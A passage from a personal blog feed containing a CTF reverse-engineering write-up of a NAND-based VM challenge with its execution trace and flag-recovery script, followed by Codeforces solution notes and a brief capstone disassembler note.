v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -9
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (8)
v14 = v1[320] (8)
c = v14
v13 = v1[150] (56)
c += v13
v10 = c(297)
dword_6010A4 = v10
v14 = v1[324] )
c = v14
v8 = dword_6010A4
v12 = c
v1[297] = v12 (8)
v10 = v1[320] (56)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (57)
v15 = &amp;v1[325] (7)
--*v15
v14 = v1[320] (9)
c = v14
v10 = c(57)
dword_6010A4 = v10
v13 = v1[92] (57)
c += v13
v6 = c
v14 = v1[298] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 57 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (9)
c = v14
dword_6010A4 = -49 ; c = 57
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-10)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -10
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (9)
v14 = v1[320] (9)
c = v14
v13 = v1[150] (57)
c += v13
v10 = c(298)
dword_6010A4 = v10
v14 = v1[324] ( )
c = v14
v8 = dword_6010A4
v12 = c
v1[298] = v12 (9)
v10 = v1[320] (57)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (58)
v15 = &amp;v1[325] (6)
--*v15
v14 = v1[320] (:)
c = v14
v10 = c(58)
dword_6010A4 = v10
v13 = v1[92] (58)
c += v13
v6 = c
v14 = v1[299] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 58 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (:)
c = v14
dword_6010A4 = -49 ; c = 58
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-11)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -11
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (10)
v14 = v1[320] (:)
c = v14
v13 = v1[150] (58)
c += v13
v10 = c(299)
dword_6010A4 = v10
v14 = v1[324] (
)
c = v14
v8 = dword_6010A4
v12 = c
v1[299] = v12 (10)
v10 = v1[320] (58)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (59)
v15 = &amp;v1[325] (5)
--*v15
v14 = v1[320] (;)
c = v14
v10 = c(59)
dword_6010A4 = v10
v13 = v1[92] (59)
c += v13
v6 = c
v14 = v1[300] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 59 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (;)
c = v14
dword_6010A4 = -49 ; c = 59
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-12)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -12
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (11)
v14 = v1[320] (;)
c = v14
v13 = v1[150] (59)
c += v13
v10 = c(300)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[300] = v12 (11)
v10 = v1[320] (59)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (60)
v15 = &amp;v1[325] (4)
--*v15
v14 = v1[320] (&lt;)
c = v14
v10 = c(60)
dword_6010A4 = v10
v13 = v1[92] (60)
c += v13
v6 = c
v14 = v1[301] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 60 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (&lt;)
c = v14
dword_6010A4 = -49 ; c = 60
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-13)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -13
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (12)
v14 = v1[320] (&lt;)
c = v14
v13 = v1[150] (60)
c += v13
v10 = c(301)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[301] = v12 (12)
v10 = v1[320] (60)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (61)
v15 = &amp;v1[325] (3)
--*v15
v14 = v1[320] (=)
c = v14
v10 = c(61)
dword_6010A4 = v10
v13 = v1[92] (61)
c += v13
v6 = c
v14 = v1[302] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 61 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (=)
c = v14
dword_6010A4 = -49 ; c = 61
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-14)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -14
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (13)
v14 = v1[320] (=)
c = v14
v13 = v1[150] (61)
c += v13
v10 = c(302)
dword_6010A4 = v10
)14 = v1[324] (
c = v14
v8 = dword_6010A4
v12 = c
v1[302] = v12 (13)
v10 = v1[320] (61)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (62)
v15 = &amp;v1[325] (2)
--*v15
v14 = v1[320] (&gt;)
c = v14
v10 = c(62)
dword_6010A4 = v10
v13 = v1[92] (62)
c += v13
v6 = c
v14 = v1[303] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 62 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (&gt;)
c = v14
dword_6010A4 = -49 ; c = 62
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-15)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -15
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (14)
v14 = v1[320] (&gt;)
c = v14
v13 = v1[150] (62)
c += v13
v10 = c(303)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[303] = v12 (14)
v10 = v1[320] (62)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (63)
v15 = &amp;v1[325] (1)
--*v15
v14 = v1[320] (?)
c = v14
v10 = c(63)
dword_6010A4 = v10
v13 = v1[92] (63)
c += v13
v6 = c
v14 = v1[304] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 63 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (?)
c = v14
dword_6010A4 = -49 ; c = 63
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-16)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -16
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (15)
v14 = v1[320] (?)
c = v14
v13 = v1[150] (63)
c += v13
v10 = c(304)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[304] = v12 (15)
v10 = v1[320] (63)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (64)
v15 = &amp;v1[325] (0)
v14 = v1[326] ()
c = v14
v13 = v1[188] (31)
c += v13
v6 = c
v14 = v1[36] (  )
c = v14
v10 = c(9)
dword_6010A4 = v10
v14 = v1[326] ()
c = v14
v13 = v1[200] (31)
c += v13
v6 = c
v14 = v1[304] ()
c = v14
__dword_6010A4 = 9     c = 15
v14 = c - dword_6010A4
c = v14
v10 =v1[353] (336)
dword_6010A4 = v10
dword_6010A4++
v14 = v1[337] (W)
c = v14
output:
Wv15 = &amp;v1[336] (5)
--*v15
dword_6010A4++
v14 = v1[338] (r)
c = v14
output:
rv15 = &amp;v1[336] (4)
--*v15
dword_6010A4++
v14 = v1[339] (o)
c = v14
output:
ov15 = &amp;v1[336] (3)
--*v15
dword_6010A4++
v14 = v1[340] (n)
c = v14
output:
nv15 = &amp;v1[336] (2)
--*v15
dword_6010A4++
v14 = v1[341] (g)
c = v14
output:
gv15 = &amp;v1[336] (1)
--*v15
dword_6010A4++
v14 = v1[342] (
)
c = v14
output:

v15 = &amp;v1[336] (0)
return
0
</code></pre>
<p>To analyze what it did, we can start from how it print and read. From testing, it read 32 characters(which is the length of flag). And we know that the input is store in v1[273] ~ v1[304]. It’s basicly a NAND machine. From what we got after stimulate the program, we can see 32 ‘blocks’ and each blocks got four <code>NAND</code>.</p>
<p><img src="/2023/03/03/VM/blocks.png" alt="VM"></p>
<h5 id="That’s-what-we-got"><a href="#That’s-what-we-got" class="headerlink" title="That’s what we got:"></a>That’s what we got:</h5><pre><code>d_1 = ((a nand b) nand b) nand ((a nand b) nand b) 
</code></pre>
<p>All of them make <code>xor</code>. Go back to the main vm_run function, here’s what the rest of the case do:</p>
<p><img src="/2023/03/03/VM/1.png" alt="VM"><br><img src="/2023/03/03/VM/2.png" alt="VM"></p>
<h5 id="So-dynamic-debugger-to-dump-the-array-v1-and-the-script"><a href="#So-dynamic-debugger-to-dump-the-array-v1-and-the-script" class="headerlink" title="So dynamic debugger to dump the array v1 and the script:"></a>So dynamic debugger to dump the array <code>v1</code> and the script:</h5><pre><code class="cpp">#include&lt;bits/stdc++.h&gt;
using namespace std;
int main()&#123;
    int a[]=&#123;1, 48, 0, 0, 0, 16, 24, 67, 20, 21, 71, 64, 23, 16, 29, 75, 18, 31, 73, 72, 24, 83, 84, 1, 87, 81, 83, 5, 86, 90, 8, 88, 95, 10, 12, 88, 9, 0, 1, 2, 3, 4, 5, 6, 0, 0, 0, 0, 21, 0, 1, 0, 0, 14, 18, 11, 12, 0, 1, 0, 0, 53, 0, 0, 0, 102, 21, 16, 1, 0, 0, 14, 10, 102, 22, 12, 16, 1, 0, 0, 71, 0, 0, 0, 102, 3, 64, 1, 0, 0, 16, 17, 241, 0, 0, 0, 19, 4, 67, 1, 0, 0, 8, 4, 65, 1, 0, 0, 16, 3, 64, 1, 0, 0, 8, 4, 66, 1, 0, 0, 3, 65, 1, 0, 0, 3, 67, 1, 0, 0, 8, 16, 3, 66, 1, 0, 0, 8, 4, 68, 1, 0, 0, 102, 3, 64, 1, 0, 0, 17, 241, 0, 0, 0, 16, 3, 68, 1, 0, 0, 22, 5, 64, 1, 0, 0, 14, 6, 64, 1, 0, 0, 12, 69, 1, 0, 0, 85, 0, 0, 0, 102, 3, 70, 1, 0, 0, 17, 5, 0, 0, 0, 19, 16, 3, 70, 1, 0, 0, 17, 17, 1, 0, 0, 19, 23, 24, 96, 1, 0, 0, 12, 70, 1, 0, 0, 182, 0, 0, 0, 1, 118, 1, 0, 0, 102, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 73, 110, 112, 117, 116, 32, 70, 108, 97, 103, 58, 0, 0, 0, 15, 0, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 52, 53, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 245, 202, 10, 53, 0, 31, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 87, 114, 111, 110, 103, 10, 82, 105, 103, 104, 116, 10, 0, 0, 0, 21, 80, 1, 0, 0, 14, 18, 11, 12, 80, 1, 0, 0, 101, 1, 0, 0, 0, 0, 0, 0, 0, 21, 86, 1, 0, 0, 14, 18, 11, 12, 80, 1, 0, 0, 123, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0&#125;;
    int b[32]=&#123;0&#125;;
    int flag[]=&#123;0&#125;;
    for (int i=0;i&lt;36;i++)&#123;
        flag[i]=(i+32)^a[i+5];
    &#125;
    for (int i=0;i&lt;32;i++)&#123;
        cout&lt;&lt;(char)flag[i];
    &#125;
&#125;
</code></pre>
<p><img src="/2023/03/03/VM/3.png" alt="3"></p>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>codeforce-1719C</title>
    <url>/2022/08/29/codeforce-1719C/</url>
    <content><![CDATA[<h1 id="codeforces-1719C"><a href="#codeforces-1719C" class="headerlink" title="codeforces 1719C"></a>codeforces 1719C</h1><span id="more"></span>
<h3 id="The-problem"><a href="#The-problem" class="headerlink" title="The problem"></a>The problem</h3><blockquote>
<p>C. Fighting Tournament<br>time limit per test2 seconds<br>memory limit per test256 megabytes<br>inputstandard input<br>outputstandard output<br>Burenka is about to watch the most interesting sporting event of the year — a fighting tournament organized by her friend Tonya.<br>n athletes participate in the tournament, numbered from 1 to n. Burenka determined the strength of the i-th athlete as an integer ai, where 1≤ai≤n. All the strength values are different, that is, the array a is a permutation of length n. We know that in a fight, if ai&gt;aj, then the i-th participant always wins the j-th.<br>The tournament goes like this: initially, all n athletes line up in ascending order of their ids, and then there are infinitely many fighting rounds. In each round there is exactly one fight: the first two people in line come out and fight. The winner goes back to the front of the line, and the loser goes to the back.<br>Burenka decided to ask Tonya q questions. In each question, Burenka asks how many victories the i-th participant gets in the first k rounds of the competition for some given numbers i and k. Tonya is not very good at analytics, so he asks you to help him answer all the questions.</p>
<blockquote>
<p>Input<br>The first line contains one integer t (1≤t≤104) — the number of test cases. Description of the test cases follows.<br>The first line of each test case contains two integers n and q (2≤n≤105, 1≤q≤105) — the number of tournament participants and the number of questions.<br>The second line of each test case contains n integers a1,a2,…,an (1≤ai≤n) — the array a, which is a permutation.<br>The next q lines of a test case contain questions. Each line contains two integers i and k (1≤i≤n, 1≤k≤109) — the number of the participant and the number of rounds.<br>It is guaranteed that the sum of n and the sum of q over all test cases do not exceed 105.<br>Output<br>For each Burenka’s question, print a single line containing one integer — the answer to the question.</p>
</blockquote>
</blockquote>
<!--more-->
<h4 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h4><h5 id="It’s-not-a-very-hard-problem-but-contains-many-details-This-is-the-record-when-I-tried"><a href="#It’s-not-a-very-hard-problem-but-contains-many-details-This-is-the-record-when-I-tried" class="headerlink" title="It’s not a very hard problem, but contains many details. This is the record when I tried:"></a>It’s not a very hard problem, but contains many details. This is the record when I tried:</h5><p><img src="/2022/08/29/codeforce-1719C/1719C.png"></p>
<hr>
<h5 id="The-basic-solution-for-this-problem-is-to-find-out-if-there-are-numbers-bigger-then-a-i-if-so-the-guy-with-the-number-i-CAN-NOT-WIN-ANYBODY-else-tried-to-find-the-number-of-the-guys-AFTER-HIM-with-smaller-a-This-number-is-the-BIGGEST-number-of-his-victories-You-might-notices-if-the-guy-is-the-best-in-the-whole-queue-then-he-can-win-any-guys-he-met-depend-how-big-the-k-is-others-can-not-because-they-may-met-this-guy-and-his-game-can-be-called-“over”"><a href="#The-basic-solution-for-this-problem-is-to-find-out-if-there-are-numbers-bigger-then-a-i-if-so-the-guy-with-the-number-i-CAN-NOT-WIN-ANYBODY-else-tried-to-find-the-number-of-the-guys-AFTER-HIM-with-smaller-a-This-number-is-the-BIGGEST-number-of-his-victories-You-might-notices-if-the-guy-is-the-best-in-the-whole-queue-then-he-can-win-any-guys-he-met-depend-how-big-the-k-is-others-can-not-because-they-may-met-this-guy-and-his-game-can-be-called-“over”" class="headerlink" title="The basic solution for this problem is to find out if there are numbers bigger then a[i], if so, the guy with the number i CAN NOT WIN ANYBODY, else, tried to find the number of the guys AFTER HIM with smaller a[]. This number is the BIGGEST number of his victories. You might notices, if the guy is the best in the whole queue, then he can win any guys he met(depend how big the k is), others can not because they may met this guy and his game can be called “over”."></a>The basic solution for this problem is to find out if there are numbers bigger then a[i], if so, the guy with the number i CAN NOT WIN ANYBODY, else, tried to find the number of the guys AFTER HIM with smaller a[]. This number is the BIGGEST number of his victories. You might notices, if the guy is the best in the whole queue, then he can win any guys he met(depend how big the k is), others can not because they may met this guy and his game can be called “over”.</h5><h4 id="DETAILS"><a href="#DETAILS" class="headerlink" title="DETAILS"></a>DETAILS</h4><ul>
<li><h5 id="The-first-and-second-guy-is-special-They-fight-each-other-You-can-see-that-i-gt-x3D-2-can-use-the-same-formula-So-you-shall-judge-i-x3D-x3D-1-specially-The-biggest-a-shall-also-be-judge-specially-With-those-you-answer-shall-be-right"><a href="#The-first-and-second-guy-is-special-They-fight-each-other-You-can-see-that-i-gt-x3D-2-can-use-the-same-formula-So-you-shall-judge-i-x3D-x3D-1-specially-The-biggest-a-shall-also-be-judge-specially-With-those-you-answer-shall-be-right" class="headerlink" title="The first and second guy is special. They fight each other. You can see that (i&gt;&#x3D;2) can use the same formula. So you shall judge (i&#x3D;&#x3D;1) specially. The biggest a[] shall also be judge specially. With those, you answer shall be right."></a>The first and second guy is special. They fight each other. You can see that (i&gt;&#x3D;2) can use the same formula. So you shall judge (i&#x3D;&#x3D;1) specially. The biggest a[] shall also be judge specially. With those, you answer shall be right.</h5></li>
<li><h5 id="However-you-might-get-a-“TLE”-Well-I-did-This-is-how-I-wrote-previously"><a href="#However-you-might-get-a-“TLE”-Well-I-did-This-is-how-I-wrote-previously" class="headerlink" title="However, you might get a “TLE”(Well,I did). This is how I wrote previously:"></a>However, you might get a “TLE”(Well,I did). This is how I wrote previously:</h5><code>//		for (i=1;i&lt;=n;i++)&#123;</code>	<br><code>//			if (a[i]==maxn) continue;</code><br><code>//			for (j=i+1;j&lt;=n;j++)&#123;</code><br><code>//				if (a[j]&gt;=a[i]) break;</code><br><code>//				b[i]++;</code><br><code>//&#125;</code><br><code>//			b[i]++;</code><br><code>//			if (i==1) b[i]--;</code><br><code>//			for (j=1;j&lt;i;j++)&#123;</code><br><code>//				if (a[j]&gt;a[i])&#123;</code><br><code>//					b[i]=0;</code><br><code>//					break;</code><br><code>//				&#125;</code><br><code>//			&#125;</code><br><code>//		&#125;</code></li>
</ul>
<h5 id="Clearly-O-n-2-is-too-slow-So-I-tried-to-find-another-way"><a href="#Clearly-O-n-2-is-too-slow-So-I-tried-to-find-another-way" class="headerlink" title="Clearly, O(n^2) is too slow. So I tried to find another way."></a>Clearly, O(n^2) is too slow. So I tried to find another way.</h5><h5 id="We-can-find-that-the-whole-work-can-be-done-in-LINEAR-TIME-Like-this"><a href="#We-can-find-that-the-whole-work-can-be-done-in-LINEAR-TIME-Like-this" class="headerlink" title="We can find that the whole work can be done in LINEAR TIME. Like this:"></a>We can find that the whole work can be done in LINEAR TIME. Like this:</h5><p><code>		int lld=1;</code><br><code>		for (i=1;i&lt;n;i++)&#123;</code><br><code>			if (a[i]&gt;a[i+1])&#123;</code><br><code>				b[lld]++;</code><br><code>				a[i+1]=a[i];</code><br><code>			&#125;</code><br><code>			else&#123;</code><br><code>				lld=i+1;</code><br><code>				b[lld]++;</code><br><code>			&#125;</code><br><code>		&#125;</code></p>
<h5 id="It’s-not-hard-to-understand-but-effective-Just-read-it-once-in-O-n-the-work-is-done"><a href="#It’s-not-hard-to-understand-but-effective-Just-read-it-once-in-O-n-the-work-is-done" class="headerlink" title="It’s not hard to understand, but effective. Just read it once(in O(n)), the work is done."></a>It’s not hard to understand, but effective. Just read it once(in O(n)), the work is done.</h5>]]></content>
      <tags>
        <tag>codeforces</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>codeforce:1720C</title>
    <url>/2022/08/28/codeforce-1720C/</url>
    <content><![CDATA[<h1 id="codeforces-1720C"><a href="#codeforces-1720C" class="headerlink" title="codeforces 1720C"></a>codeforces 1720C</h1><span id="more"></span>
<h3 id="The-problem"><a href="#The-problem" class="headerlink" title="The problem"></a>The problem</h3><blockquote>
<p>C. Corners<br>time limit per test1 second<br>memory limit per test256 megabytes<br>inputstandard input<br>outputstandard output<br>You are given a matrix consisting of n rows and m columns. Each cell of this matrix contains 0 or 1.<br>Let’s call a square of size 2×2 without one corner cell an L-shape figure. In one operation you can take one L-shape figure, with at least one cell containing 1 and replace all numbers in it with zeroes.<br>Find the maximum number of operations that you can do with the given matrix.</p>
<blockquote>
<p>Input<br>The first line contains one integer t (1≤t≤500) — the number of test cases. Then follow the descriptions of each test case.<br>The first line of each test case contains two integers n and m (2≤n,m≤500) — the size of the matrix.<br>Each of the following n lines contains a binary string of length m — the description of the matrix.<br>It is guaranteed that the sum of n and the sum of m over all test cases does not exceed 1000.<br>Output<br>For each test case output the maximum number of operations you can do with the given matrix.</p>
</blockquote>
</blockquote>
<!--more-->
<h5 id="At-first-I-didn’t-have-a-clue-So-I-tried-to-do-a-brute-force-Didn’t-work-out-of-course-The-data-volume-is-too-large-So-I-was-wondering-whether-it-could-be-solved-by-dynamic-programing-I-tried-this"><a href="#At-first-I-didn’t-have-a-clue-So-I-tried-to-do-a-brute-force-Didn’t-work-out-of-course-The-data-volume-is-too-large-So-I-was-wondering-whether-it-could-be-solved-by-dynamic-programing-I-tried-this" class="headerlink" title="At first, I didn’t have a clue. So I tried to do a brute force. Didn’t work out of course.The data volume is too large. So I was wondering whether it could be solved by dynamic programing. I tried this:"></a>At first, I didn’t have a clue. So I tried to do a brute force. Didn’t work out of course.The data volume is too large. So I was wondering whether it could be solved by dynamic programing. I tried this:</h5><blockquote>
</blockquote>
<p><code>sum[x][y]=max(sum[x-1][y-1]+b[x][y]-b[x-1][y-1],sum[x-2][y-2]+b[x][y]-b[x-2][y-2])</code></p>
<h6 id="sum-stands-for-the-maximum-number-we-need-to-solve-and-b-x-y-stands-for-the-sum-of-a-1-x-1-y"><a href="#sum-stands-for-the-maximum-number-we-need-to-solve-and-b-x-y-stands-for-the-sum-of-a-1-x-1-y" class="headerlink" title="sum[][] stands for the maximum number we need to solve, and b[x][y] stands for the sum of a[1~x][1~y]."></a>sum[][] stands for the maximum number we need to solve, and b[x][y] stands for the sum of a[1~x][1~y].</h6><h5 id="It-seemed-closed-but-got-a-WA-Well-the-initial-square-was-harder-to-define-then-I-thought-After-a-few-tried-I-decided-to-abandon-this-dp-method"><a href="#It-seemed-closed-but-got-a-WA-Well-the-initial-square-was-harder-to-define-then-I-thought-After-a-few-tried-I-decided-to-abandon-this-dp-method" class="headerlink" title="It seemed closed, but got a WA. Well, the initial square was harder to define then I thought. After a few tried, I decided to abandon this dp method."></a>It seemed closed, but got a WA. Well, the initial square was harder to define then I thought. After a few tried, I decided to abandon this dp method.</h5><h5 id="It-was-some-time-before-the-right-answer-occur-to-me-It’s-actually-pretty-easy"><a href="#It-was-some-time-before-the-right-answer-occur-to-me-It’s-actually-pretty-easy" class="headerlink" title="It was some time before the right answer occur to me. It’s actually pretty easy."></a>It was some time before the right answer occur to me. It’s actually pretty easy.</h5><h5 id="Search-every-square-of-size-2-2-if-exists-one-square-contains-at-least-two-‘0’-then-the-maximum-number-is-the-number-of-‘1’-else-the-maximun-number-is-the-number-of-‘1’-1-if-there-contains-‘0’-or-the-maximun-number-is-the-number-of-‘1’-2-if-the-whole-square-is-‘1’"><a href="#Search-every-square-of-size-2-2-if-exists-one-square-contains-at-least-two-‘0’-then-the-maximum-number-is-the-number-of-‘1’-else-the-maximun-number-is-the-number-of-‘1’-1-if-there-contains-‘0’-or-the-maximun-number-is-the-number-of-‘1’-2-if-the-whole-square-is-‘1’" class="headerlink" title="Search every square of size 2*2, if exists one square contains at least two ‘0’,then the maximum number is the number of ‘1’, else the maximun number is the number of ‘1’- 1(if there contains ‘0’) or the maximun number is the number of ‘1’- 2(if the whole square is ‘1’)"></a>Search every square of size 2*2, if exists one square contains at least two ‘0’,then the maximum number is the number of ‘1’, else the maximun number is the number of ‘1’- 1(if there contains ‘0’) or the maximun number is the number of ‘1’- 2(if the whole square is ‘1’)</h5>]]></content>
      <tags>
        <tag>codeforces</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>capstone</title>
    <url>/2022/11/06/capstone/</url>
    <content><![CDATA[<h6 id="Preface"><a href="#Preface" class="headerlink" title="Preface:"></a>Preface:</h6><h6 id="A-write-up-in-hnctf-use-capstone-to-solved-the-problem-maze-It’s-the-first-time-I-heard-of-it-so-I-am-writing-to-this-blog-for-later-review"><a href="#A-write-up-in-hnctf-use-capstone-to-solved-the-problem-maze-It’s-the-first-time-I-heard-of-it-so-I-am-writing-to-this-blog-for-later-review" class="headerlink" title="A write up in hnctf use capstone to solved the problem maze. It’s the first time I heard of it, so I am writing to this blog for later review."></a>A write up in hnctf use <code>capstone</code> to solved the problem <code>maze</code>. It’s the first time I heard of it, so I am writing to this blog for later review.</h6><h5 id="Most-thing-I-write-can-be-found-in-Official-file"><a href="#Most-thing-I-write-can-be-found-in-Official-file" class="headerlink" title="Most thing I write can be found in Official file."></a>Most thing I write can be found in <a href="http://www.capstone-engine.org/lang_python.html">Official file</a>.</h5><span id="more"></span>
<h5 id="An-example-you-can-try-before-reading"><a href="#An-example-you-can-try-before-reading" class="headerlink" title="An example you can try before reading:"></a>An example you can try before reading:</h5><pre><code># test1.py
from capstone import *

CODE = b&quot;\x55\x48\x8b\x05\xb8\x13\x00\x00&quot;

md = Cs(CS_ARCH_X86, CS_MODE_64)
for i in md.disasm(CODE, 0x1000):
    print(&quot;0x%x:\t%s\t%s&quot; %(i.address, i.mnemonic, i.op_str))

# It&#39;s the official example, you can try to change the CODE and see what happens.(Such as add a few &#39;\x55&#39; or &#39;\x48&#39; or whatever you like)
</code></pre>
<p>Trying this problem, you get the basic idea how capstone, or rather, how a <code>.exe</code> file works. It translate the binary numbers into assembly language in a queue, and when you add some thing, the whole procedure might when wrong.(You may think thit is simple, but some time we just didn’t remember to relate the whole file with simple binary numbers like wht upper <code>CODE</code>)</p>
<p>We need to know what does the function mean:</p>
<p>~to be continue</p>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>d3ctf 2023</title>
    <url>/2023/07/11/d3ctf-2023/</url>
